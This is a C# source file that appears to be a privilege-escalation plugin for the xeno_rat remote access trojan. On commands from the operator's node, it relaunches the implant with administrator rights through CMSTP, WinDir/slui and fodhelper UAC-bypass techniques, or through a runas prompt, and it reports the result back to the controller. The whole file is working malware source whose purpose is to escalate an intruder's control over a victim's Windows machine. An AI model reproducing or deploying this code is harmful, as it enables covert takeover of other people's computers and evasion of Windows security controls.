using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UacHelper;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {

        /// <summary>
        /// Runs different system commands based on the input data received from the node and sends back the result.
        /// </summary>
        /// <param name="node">The node to communicate with.</param>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the node.
        /// It then receives data from the node and processes it to run different system commands based on the input data.
        /// The method handles different scenarios based on the received data and executes corresponding system commands.
        /// After executing the commands, it sends back the result to the node as a byte array with value 1 for success and 0 for failure.
        /// If an exception occurs during the execution of system commands, it sends back a byte array with value 0 to indicate failure.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            byte[] data=await node.ReceiveAsync();
            if (data == null) 
            {
                return;
            }

            try
            {
                if (data[0] == 1)
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    CmstpHelper.Kill();
                    if (CmstpHelper.Run($"cmd /c start \"\"\"\"\" \"\"{path}\"\"\""))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                    //cmstp
                }
                else if (data[0] == 2)
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    if (await WinDirSluiHelper.Run(path))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                else if (data[0] == 3)
                {
                    string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                    if (await FodHelper.Run($"\"{path}\""))
                    {
                        await node.SendAsync(new byte[] { 1 });
                    }
                    else
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                else if (data[0] == 4)
                {
                    using (Process configTool = new Process())
                    {
                        try
                        {
                            configTool.StartInfo.FileName = System.Reflection.Assembly.GetEntryAssembly().Location;
                            configTool.StartInfo.Verb = "runas";
                            configTool.Start();
                            await node.SendAsync(new byte[] { 1 });
                        }
                        catch
                        {
                            await node.SendAsync(new byte[] { 0 });
                        }
                    }
                }
                else if (data[0] == 5)
                {
                    try
                    {
                        SystemUtility.ExecuteProcessUnElevated(System.Reflection.Assembly.GetEntryAssembly().Location,"", Directory.GetCurrentDirectory());
                        await node.SendAsync(new byte[] { 1 });
                    }
                    catch 
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                await Task.Delay(1000);
            }
            catch 
            {
                await node.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
            }
        }
    }
}
